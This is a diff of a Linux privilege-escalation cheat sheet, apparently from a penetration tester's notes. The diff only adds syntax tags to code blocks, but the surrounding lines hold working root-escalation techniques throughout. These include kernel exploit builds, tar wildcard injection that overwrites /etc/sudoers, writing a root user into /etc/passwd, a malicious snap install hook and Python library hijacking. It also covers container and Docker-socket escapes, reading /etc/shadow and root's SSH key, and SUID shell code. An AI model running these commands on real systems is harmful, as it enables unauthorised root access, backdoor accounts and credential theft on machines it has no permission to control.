@@ -19,7 +19,7 @@ We can exploit some kernel vulnerabilities in order to privesc. `linux-exploit-s
 
 * [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)
 
-```
+```bash
 ./linux-exploit-suggester.sh
 ```
 
@@ -29,13 +29,13 @@ Sometimes we need to compile our exploits in order to get the binary or executab
 
 For **64-bits:**
 
-```
+```bash
 gcc exploit.c -o exploit
 ```
 
 For **32-bits:**
 
-```
+```bash
 gcc -m32 exploit.c -o exploit
 
 #i686 and older devices
@@ -44,14 +44,14 @@ gcc -march=i686 -m32 -Wl,--hash-style=both exploit.c -o exploit
 
 Finally we just need to give execution permissions.
 
-```
+```bash
 chmod u+x executablename
 ./executablename
 ```
 
 ## eBPF\_verifier - Linux Kernel < 4.13.9
 
-```
+```bash
 $ gcc cve-2017-16995.c -o cve-2017-16995
 $ chmod +x cve-2017-16995
 
@@ -81,13 +81,13 @@ uid=0(root) gid=0(root) groups=0(root),33(www-data)
 
 ## DirtyC0w - Linux Kernel 2.6.22 < 3.9
 
-```
+```bash
 gcc -pthread dirty.c -o dirty -lcrypt
 ```
 
 Transfer the exploit to the target machine.
 
-```
+```bash
 chmod +x dirty
 ./dirty
 ```
@@ -96,7 +96,7 @@ chmod +x dirty
 
 ## Mempodipper - Linux Kernel 2.6.39 < 3.2.2 (Gentoo / Ubuntu x86/x64)
 
-```
+```bash
 $ gcc mempodipper.c -o mempodipper
 $ chmod +x mempodipper
 
@@ -143,7 +143,7 @@ But when a special permission is given to each user it becomes SUID or SGID. Whe
 
 ## **Finding SUID / GUID Binaries:**
 
-```
+```bash
 find / -perm -u=s -type f 2>/dev/null
 find / -perm -g=s -type f 2>/dev/null
 ```
@@ -156,14 +156,14 @@ find / -perm -g=s -type f 2>/dev/null
 
 Let's say we need an **SUID binary**. Running it, we can see that it’s calling the system shell to do a basic process like list processes with "ps". We can rewrite the `PATH` variable to a location of our choice. So when the SUID binary calls the system shell to run an executable, it runs one that we have written instead. So we need to change the `PATH` variable:
 
-```
+```bash
 export PATH=/tmp
 echo $PATH
 ```
 
 And create a file with execution permissions with the same binary name:
 
-```
+```bash
 echo "/bin/bash" > /tmp/ps
 /bin/chmod +x /tmp/ps
 ```
@@ -192,13 +192,13 @@ When we ssh a machine root executes `run-parts` binary so we add a malicious bin
 
 Imagine you compromise a low-level user on a system and you figure out this command is running as root:
 
-```
+```bash
 cd /var/log/mon && tar -zcf /tmp/mon.tar.gz *
 ```
 
 We want to go with **sudoers** **file** as we are lazy and just sudo bash, so let's see....
 
-```
+```bash
 echo 'echo "user ALL=(root) NOPASSWD: ALL" > /etc/sudoers' > privesc.sh
 echo "" > "--checkpoint-action=exec=sh privesc.sh"
 echo "" > --checkpoint=1
@@ -210,20 +210,20 @@ The `/etc/passwd` file stores essential information, which is required during lo
 
 if we have a writable `/etc/passwd` file, we can write a new line entry allowing us to log in as our own root user. But first, we need to create a compliant password hash.
 
-```
+```bash
 openssl passwd -1 -salt [username] [password]
 openssl passwd [password]
 ```
 
 Finally append the following string to `/etc/passwd` file:
 
-```
+```bash
 [USERNAME]:[HASH]:0:0:root:/root:/bin/bash
 ```
 
 And finally su to this new user to obtain a **root** **shell**:
 
-```
+```bash
 su [USERNAME]
 ```
 
@@ -233,7 +233,7 @@ GTFOBins is a curated list of Unix binaries that can be exploited by an attacker
 
 Firstly, we need to check the sudo permissions on binaries:
 
-```
+```bash
 sudo -l
 ```
 
@@ -241,7 +241,7 @@ After that search on [GTOBins web ](https://gtfobins.github.io)to search how to 
 
 * [https://gtfobins.github.io/](https://gtfobins.github.io)
 
-```
+```bash
 User user may run the following commands on armageddon:
     (root) NOPASSWD: /usr/bin/someBinary
 ```
@@ -252,14 +252,14 @@ User user may run the following commands on armageddon:
 
 This mean that we can set some environment variables to run the command.
 
-```
+```bash
 User user may run the following commands on admirer:
     (ALL) SETENV: /opt/scripts/some.py
 ```
 
 Search for a library, create a copy in `/tmp` and execute commands.
 
-```
+```python
 some.py
 
 import sys
@@ -268,7 +268,7 @@ sys.exit(10)
 
 We can create a sys.py file on `/tmp`.
 
-```
+```python
 import os
 def exit(a):
         os.system("cp /bin/bash /tmp/rev")
@@ -277,7 +277,7 @@ def exit(a):
 
 Finally open the backdoor.
 
-```
+```bash
 /tmp/rev -p
 rev-4.4# id
 uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
@@ -285,7 +285,7 @@ uid=1000(user) gid=1000(user) euid=0(root) groups=1000(user)
 
 ## Snap install
 
-```
+```bash
 User user may run the following commands on armageddon:
     (root) NOPASSWD: /usr/bin/snap install *
 ```
@@ -295,7 +295,7 @@ When we find the following, we can install any malicious packet, so we will add 
 * [https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy](https://ubuntu.com/tutorials/create-your-first-snap#3-building-a-snap-is-easy)
 * [https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html](https://shenaniganslabs.io/2019/02/13/Dirty-Sock.html)
 
-```
+```bash
 mkdir privesnap
 cd privesnap
 snapcraft init
@@ -307,7 +307,8 @@ We need to create a malicious `snap/hooks/install` file, and modify `snap/snapcr
 
 
 * install
-```
+
+```bash
 #!/bin/bash
 
 # dirty_sock:dirty_sock
@@ -316,7 +317,8 @@ usermod -aG sudo dirty_sock
 echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
 ```
 * snapcraft.yaml
-```
+
+```bash
 name: privesnap
 version: '0.1' 
 summary: Empty snap, used for exploit
@@ -335,7 +337,7 @@ parts:
 
 > Linux capabilities provide a subset of the available root privileges to a process. This effectively breaks up root privileges into smaller and distinctive units. Each of these units can then be independently be granted to processes. This way the full set of privileges is reduced and decreasing the risks of exploitation.
 
-```
+```bash
 getcap -r / 2>/dev/null
 ```
 
@@ -355,7 +357,7 @@ The `Cron` daemon is a long-running process that executes commands at specific d
 
 **To view what cronjobs are active** we need to cat the `/etc/crontab` file:
 
-```
+```bash
 cat /etc/crontab
 ```
 
@@ -367,7 +369,7 @@ If we find a script that is scheduled to run as user root and we can write to th
 
 Thats it, you're already root:
 
-```
+```bash
 sudo su -
 ```
 
@@ -377,7 +379,7 @@ A member of the local “lxd” group can instantly escalate the privileges to r
 
 ### With Internet
 
-```
+```bash
 lxc init ubuntu:16:04 myimage -c security.privileged=true
 lxc config device add myimage whatever disk source=/ path=/mnt/root recursive=true
 lxc start test
@@ -388,7 +390,7 @@ lxc exec test bash
 
 Build an Alpine image and start it using the flag `security.privileged=true`, forcing the container to interact as root with the host filesystem.
 
-```
+```bash
 # build a simple alpine image
 git clone https://github.com/saghul/lxd-alpine-builder
 cd lxd-alpine-builder
@@ -398,13 +400,13 @@ sudo ./build-alpine -a i686
 
 Also you can download directly the image from ubuntu:
 
-```
+```bash
 wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-root.tar.xz
 wget http://cloud-images.ubuntu.com/xenial/current/xenial-server-cloudimg-amd64-lxd.tar.xz
 And exploit it:
 ```
 
-```
+```bash
 # import the image
 lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.
 lxc image import xenial-server-cloudimg-amd64-*.tar.xz --alias myimage # Or this depending if you downloaded
@@ -435,7 +437,7 @@ All members of the group `admin` have access to logs files:
 
 All members of the gorup `disk` have full access to the filesystem.
 
-```
+```bash
 df -h #search disk
 
 debugfs /dev/sda1
@@ -446,7 +448,7 @@ debugfs: cat /etc/shadow
 
 We can also write files on the filesystem.
 
-```
+```bash
 debugfs -w /dev/sda1
 debugfs: dump file1.txt file2.txt  #Copy file1.txt to file2.txt
 ```
@@ -457,7 +459,7 @@ debugfs: dump file1.txt file2.txt  #Copy file1.txt to file2.txt
 
 The video group has access to view the screen output of all opened sessions (tty). With `w` command we can see the who is logged on the server:
 
-```
+```bash
 moshe@falafel:/var/log$ w
  17:35:42 up  3:40,  3 users,  load average: 0.22, 0.09, 0.08
 USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
@@ -468,7 +470,7 @@ moshe    pts/1    10.10.14.20      17:18   15:17   0.03s  0.03s bash
 
 So we need to grab the video output and graphics configuration.
 
-```
+```bash
 moshe@falafel:/var/log$ cat /dev/fb0 > /tmp/screen.raw
 moshe@falafel:/var/log$ cat /sys/class/graphics/fb0/virtual_size
 1176,885
@@ -482,7 +484,7 @@ Finally we can open the data with GIMP.
 
 Since we are member of docker group, we can mount the root filesystem of the host machine to an instance's volume.
 
-```
+```bash
 $ docker image ls
 REPOSITORY          TAG                 IMAGE ID            CREATED             SIZE
 ubuntu              latest              775349758637        22 months ago       64.2MB
@@ -508,13 +510,13 @@ When we start a docker with the privileged flag `--privileged` , we give the suf
 
 When the `root` user is owned, we will search the host drive:
 
-```
+```bash
 fdisk -l
 ```
 
 After finding the Linux sda we will mount it:
 
-```
+```bash
 mkdir -p /mnt/host_drive
 mount /dev/sda1 /mnt/host_drive
 ```
@@ -527,25 +529,25 @@ By default, when the `docker` command is executed on a host, an API call to the 
 
 ### Check if socket is available
 
-```
+```bash
 ls -alh /var/run/docker.sock
 ```
 
 ### List all containers
 
-```
+```bash
 curl -ik --unix-socket /var/run/docker.sock http://<docker_host>:PORT/containers/json
 ```
 
 ### Create an exec
 
-```
+```bash
 curl -ik -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" --data-binary '{"AttachStdin": true,"AttachStdout": true,"AttachStderr": true,"Cmd": ["cat", "/etc/passwd"],"DetachKeys": "ctrl-p,ctrl-q","Privileged": true,"Tty": true}' http://<docker_host>:PORT/containers/<container_id>/exec
 ```
 
 ### Start the exec
 
-```
+```bash
 curl -ik -X POST --unix-socket /var/run/docker.sock -H "Content-Type: application/json" --data-binary '{"Detach": false,"Tty": true} http://<docker_host>:PORT/exec/<exec_id>/start' 
 ```
 
@@ -555,7 +557,7 @@ curl -ik -X POST --unix-socket /var/run/docker.sock -H "Content-Type: applicatio
 
 A vulnerability in the USBCreator D-Bus interface allows an attacker with access to a user in the **sudoer group to bypass the password** security policy imposed by the sudo program. The vulnerability allows an attacker to overwrite arbitrary files with arbitrary content, as root – **without supplying a password.**
 
-```
+```bash
 gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /root/.ssh/id_rsa /id_rsa true
 ```
 
@@ -567,7 +569,7 @@ gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCr
 
 We can create a new user and add it to the sudoers file:
 
-```
+```bash
 #!/bin/bash
 
 useradd dirty_sock -m -p '$6$sWZcW1t25pfUdBuX$jWjEZQF2zFSfyGy9LbvG3vFzzHRjXfBYK0SOGfMD1sLyaS97AwnJUs7gDCY.fg19Ns3JwRdDhOcEmDpBVlF9m.' -s /bin/bash
@@ -579,7 +581,7 @@ echo "dirty_sock    ALL=(ALL:ALL) ALL" >> /etc/sudoers
 
 We can copy the bash file to temp and give it SUID permissions.
 
-```
+```bash
 cp /bin/bash /tmp/bash
 chmod u+s /tmp/bash
 
@@ -588,7 +590,7 @@ chmod u+s /tmp/bash
 
 ## Creating a SUID file (c)
 
-```
+```c
 #include <unistd.h>
 int main()
 {
@@ -602,7 +604,7 @@ int main()
 
 We can write the following C code in order to obtain a bash shell:
 
-```
+```c
 #include <stdio.h>
 #include <unistd.h>
 
@@ -614,14 +616,14 @@ int main (void) {
 
 We just need to compile and give SUID permissions from root in our attacking machine.
 
-```
+```bash
 gcc -m32 shell.c -o shell
 root@kali $ chmod +s shell
 ```
 
 Finally we need to transfer the file with the command execution.
 
-```
+```bash
 /tmp/shell -p
 ```
 
@@ -631,13 +633,13 @@ Capabilities are those permissions that divide the privileges of kernel user or 
 
 Search files with capabilities:
 
-```
+```bash
 getcap -r / 2>/dev/null
 ```
 
 ## Python Capability
 
-```
+```bash
 python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
 ```
 
